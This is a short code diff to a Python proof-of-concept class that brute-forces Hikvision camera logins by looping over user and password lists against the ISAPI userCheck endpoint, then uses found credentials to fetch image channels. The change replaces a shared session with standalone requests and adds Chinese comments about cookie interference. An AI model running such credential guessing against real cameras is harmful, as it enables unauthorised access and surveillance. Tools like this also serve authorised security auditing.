@@ -17,13 +17,15 @@ class HikvisionWeakPassword(POCTemplate):
         self.ref = ''
         self.level = POCTemplate.level.medium
         self.desc = """"""
-        self.headers = {'User-Agent': self.config.user_agent}
+        # 使用独立 requests 而非 self.session，避免 cookie 残留干扰后续 Digest Auth 快照
+        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
 
     def verify(self, ip, port=80):
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
-                    r = self.session.get(
+                    # 使用独立 requests.get（旧版行为），避免 self.session cookie 干扰
+                    r = requests.get(
                         url=f"http://{ip}:{port}/ISAPI/Security/userCheck",
                         auth=(user, password),
                         timeout=self.config.timeout,
@@ -40,7 +42,8 @@ class HikvisionWeakPassword(POCTemplate):
         ip, port, product, user, password, vul = results
         channels = 1
         try:
-            res = self.session.get(
+            # 使用独立 requests.get，避免 self.session cookie 残留干扰 Digest Auth
+            res = requests.get(
                 f"http://{ip}:{port}/ISAPI/Image/channels",
                 auth=HTTPDigestAuth(user, password),
                 headers=self.headers,
